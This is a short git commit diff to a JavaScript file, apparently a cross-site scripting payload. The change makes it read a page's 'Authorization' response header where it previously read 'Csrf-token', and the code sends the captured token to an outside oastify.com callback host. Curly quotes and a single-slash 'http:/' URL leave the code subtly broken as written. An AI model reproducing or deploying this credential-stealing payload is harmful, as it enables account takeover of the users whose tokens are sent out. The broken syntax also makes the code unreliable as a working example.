36ff5acb716ecec9dc170042023cf5401e2e3b50
Byshop <60990002+byshop04@users.noreply.github.com>
2022-10-26 00:11:32 -0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -4,7 +4,7 @@ xhr.onreadystatechange = function()
 {
 if (xhr.readyState == 4 && xhr.status == 200)
 {
-var yourtoken = xhr.getResponseHeader(‘Csrf-token’)
+var yourtoken = xhr.getResponseHeader(‘Authorization’)
 var xhr2 = new XMLHttpRequest();
 xhr2.open(“GET”, “http:/vgfbdhrogf036t34ia1nut4gh7nxbm.oastify.com/"+ yourtoken );
 xhr2.send();
